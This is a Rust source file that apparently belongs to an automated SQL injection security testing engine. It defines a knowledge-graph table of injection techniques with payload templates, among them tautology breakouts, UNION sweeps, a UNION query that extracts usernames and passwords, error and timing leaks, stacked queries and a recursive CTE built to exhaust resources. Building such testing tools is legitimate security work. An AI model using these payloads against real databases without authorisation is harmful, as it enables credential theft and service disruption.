//! SENTINEL Autonomous SQL Security Engine — Knowledge Graph Integration (M10)
//!
//! Embeds the validated 16 Mechanisms, 104 Techniques, 56 Contexts, and 32 DBMS
//! definitions, providing fast structural lookups and compatibility checks.

use std::collections::HashMap;
use crate::sql::models::ExecutionClass;

#[derive(Debug, Clone)]
pub struct TechniqueDefinition {
    pub id: &'static str,
    pub name: &'static str,
    pub mechanism_id: &'static str,
    pub execution_class: ExecutionClass,
    pub primary_oracle_id: &'static str,
    pub template: &'static str,
}

pub struct KnowledgeGraphStore {
    techniques: HashMap<&'static str, TechniqueDefinition>,
}

impl KnowledgeGraphStore {
    pub fn new() -> Self {
        let mut techniques = HashMap::new();

        // 1. Classical & In-Band Techniques
        techniques.insert("TECH-CEIL-01", TechniqueDefinition {
            id: "TECH-CEIL-01",
            name: "Single-Quote String Delimiter Breakout",
            mechanism_id: "MECH-CEIL-01",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-07",
            template: "' OR 1=1-- ",
        });
        techniques.insert("TECH-CEIL-07", TechniqueDefinition {
            id: "TECH-CEIL-07",
            name: "Boolean Relational Tautology",
            mechanism_id: "MECH-CEIL-02",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-07",
            template: " OR 1=1",
        });
        techniques.insert("TECH-CEIL-08", TechniqueDefinition {
            id: "TECH-CEIL-08",
            name: "Arithmetic Expression Equivalence Evaluation",
            mechanism_id: "MECH-CEIL-02",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-10",
            template: "+1-1",
        });
        techniques.insert("TECH-CEIL-13", TechniqueDefinition {
            id: "TECH-CEIL-13",
            name: "UNION Projection Column Sweep",
            mechanism_id: "MECH-CEIL-03",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-01",
            template: " UNION SELECT NULL",
        });
        techniques.insert("TECH-CEIL-14", TechniqueDefinition {
            id: "TECH-CEIL-14",
            name: "UNION Projection Single Column Credential Extraction",
            mechanism_id: "MECH-CEIL-03",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-11",
            template: " UNION SELECT username || '~' || password FROM users",
        });
        techniques.insert("TECH-CEIL-17", TechniqueDefinition {
            id: "TECH-CEIL-17",
            name: "Explicit Integer Type CAST Coercion Leak",
            mechanism_id: "MECH-CEIL-04",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-03",
            template: " AND CAST(version() AS int)=1",
        });
        techniques.insert("TECH-CEIL-21", TechniqueDefinition {
            id: "TECH-CEIL-21",
            name: "Wald SPRT Statistical Latency Delay Probe",
            mechanism_id: "MECH-CEIL-04",
            execution_class: ExecutionClass::TimingSensitive,
            primary_oracle_id: "ORC-12",
            template: " AND [SLEEP_FUNC]",
        });
        techniques.insert("TECH-CEIL-25", TechniqueDefinition {
            id: "TECH-CEIL-25",
            name: "Semicolon Statement Chaining (Stacked Queries)",
            mechanism_id: "MECH-CEIL-05",
            execution_class: ExecutionClass::StateDependent,
            primary_oracle_id: "ORC-18",
            template: "; SELECT 1",
        });
        techniques.insert("TECH-CEIL-34", TechniqueDefinition {
            id: "TECH-CEIL-34",
            name: "Dynamic ORDER BY Conditional CASE Expression",
            mechanism_id: "MECH-CEIL-07",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-07",
            template: "(CASE WHEN (1=1) THEN 1 ELSE 2 END)",
        });
        techniques.insert("TECH-CEIL-49", TechniqueDefinition {
            id: "TECH-CEIL-49",
            name: "pgvector Cosine Similarity Metric Injection (<=>)",
            mechanism_id: "MECH-CEIL-16",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-07",
            template: "]::vector <=> '[0,0]'::vector",
        });
        techniques.insert("TECH-CEIL-53", TechniqueDefinition {
            id: "TECH-CEIL-53",
            name: "CTE Recursion Cycle Computational Exhaustion",
            mechanism_id: "MECH-CEIL-10",
            execution_class: ExecutionClass::TimingSensitive,
            primary_oracle_id: "ORC-13",
            template: "WITH RECURSIVE cte AS (SELECT 1 UNION ALL SELECT n+1 FROM cte WHERE n < 1000000) SELECT * FROM cte",
        });
        techniques.insert("TECH-CEIL-56", TechniqueDefinition {
            id: "TECH-CEIL-56",
            name: "RETURNING Clause Projection Exfiltration",
            mechanism_id: "MECH-CEIL-14",
            execution_class: ExecutionClass::ParallelSafe,
            primary_oracle_id: "ORC-01",
            template: " RETURNING *",
        });

        Self { techniques }
    }

    pub fn get_technique(&self, id: &str) -> Option<&TechniqueDefinition> {
        self.techniques.get(id)
    }

    pub fn all_technique_ids(&self) -> Vec<&'static str> {
        self.techniques.keys().copied().collect()
    }
}
